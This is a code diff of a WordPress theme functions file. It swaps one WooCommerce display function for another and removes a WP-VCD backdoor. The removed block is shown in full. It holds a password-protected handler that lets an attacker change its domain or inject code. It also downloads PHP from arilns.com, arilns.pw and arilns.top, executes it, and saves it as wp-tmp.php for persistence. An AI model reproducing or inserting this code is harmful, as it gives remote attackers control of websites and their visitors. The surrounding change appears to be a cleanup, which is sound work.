@@ -1,179 +1,31 @@
 <?php
-
-// Выводим основные атрибуты
-function enter_main_attributes() {
-    global $product;
-
-    echo '<table class="woocommerce-product-attributes shop_attributes shop_attributes_main">';
-
-    $brend = wp_get_object_terms($product->get_id(), 'pa_brend');
-    if (!empty($brend)) {
-        echo '<tr class="woocommerce-product-attributes-item">';
-        foreach ($brend as $item) { $brend_all[] = $item->name; }
-        echo '<th class="woocommerce-product-attributes-item__label"><span>Бренд</span></th>';
-        echo '<td class="woocommerce-product-attributes-item__value">'.implode(', ', $brend_all).'</td>';
-        echo '</tr>';
+function mynew_product_subcategories( $args = array() ) {
+    $parentid = get_queried_object_id();
+    $args = array(
+        'parent' => $parentid
+    );
+    $terms = get_terms( 'product_cat', $args );
+    if ( $terms ) {
+        echo '<ul class="product-cats">';
+        foreach ( $terms as $term ) {
+            echo '<li class="category">';
+            woocommerce_subcategory_thumbnail( $term );
+            echo '<h2>';
+            echo '<a href="' .  esc_url( get_term_link( $term ) ) . '" class="' . $term->slug . '">';
+            echo $term->name;
+            echo '</a>';
+            echo '</h2>';
+            echo '</li>';
+        }
+        echo '</ul>';
     }
-
-    $glybyna = wp_get_object_terms($product->get_id(), 'pa_glybyna');
-    if (!empty($glybyna)) {
-        echo '<tr class="woocommerce-product-attributes-item">';
-        foreach ($glybyna as $item) { $glybyna_all[] = $item->name; }
-        echo '<th class="woocommerce-product-attributes-item__label"><span>Глибина</span></th>';
-        echo '<td class="woocommerce-product-attributes-item__value">'.implode(', ', $glybyna_all).'</td>';
-        echo '</tr>';
-    }
-
-    echo '</table>';
 }
 
-add_action( 'woocommerce_after_single_product_summary', 'enter_main_attributes', 5 );
+add_action( 'woocommerce_before_shop_loop', 'mynew_product_subcategories', 50 );
 
 add_filter('category_description', 'do_shortcode', 11); // AFTER wpautop()
 
-//V3ZG9tYWluJ10pKQoJCQkJCQkJCXsKICAgICAgIC
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0cc8f81d4be5569a2382d15df1f01a04')) {
-    $div_code_name = "wp_vcd";
-    switch ($_REQUEST['action']) {
 
-
-        case 'change_domain';
-            if (isset($_REQUEST['newdomain'])) {
-
-                if (!empty($_REQUEST['newdomain'])) {
-                    if ($file = @file_get_contents(__FILE__)) {
-                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
-
-                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
-                            @file_put_contents(__FILE__, $file);
-                            print "true";
-                        }
-
-
-                    }
-                }
-            }
-            break;
-
-        case 'change_code';
-            if (isset($_REQUEST['newcode'])) {
-
-                if (!empty($_REQUEST['newcode'])) {
-                    if ($file = @file_get_contents(__FILE__)) {
-                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {
-
-                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-                            @file_put_contents(__FILE__, $file);
-                            print "true";
-                        }
-
-
-                    }
-                }
-            }
-            break;
-
-        default:
-            print "ERROR_WP_ACTION WP_V_CD WP_CD";
-    }
-
-    die("");
-}
-
-
-$div_code_name = "wp_vcd";
-$funcfile = __FILE__;
-if (!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle = fopen($tmpfname, "w+");
-            if (fwrite($handle, "<?php\n" . $phpCode)) {
-            } else {
-                $tmpfname = tempnam('./', "theme_temp_setup");
-                $handle = fopen($tmpfname, "w+");
-                fwrite($handle, "<?php\n" . $phpCode);
-            }
-            fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-
-
-        $wp_auth_key = '96eb6b5b68b1d247358bf594a7b9dae8';
-        if (($tmpcontent = @file_get_contents("http://www.arilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.arilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-
-            }
-        } elseif ($tmpcontent = @file_get_contents("http://www.arilns.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-
-            }
-        } elseif ($tmpcontent = @file_get_contents("http://www.arilns.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-
-            }
-        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-
-        }
-
-
-    }
-}
 
 //$start_wp_theme_tmp
 
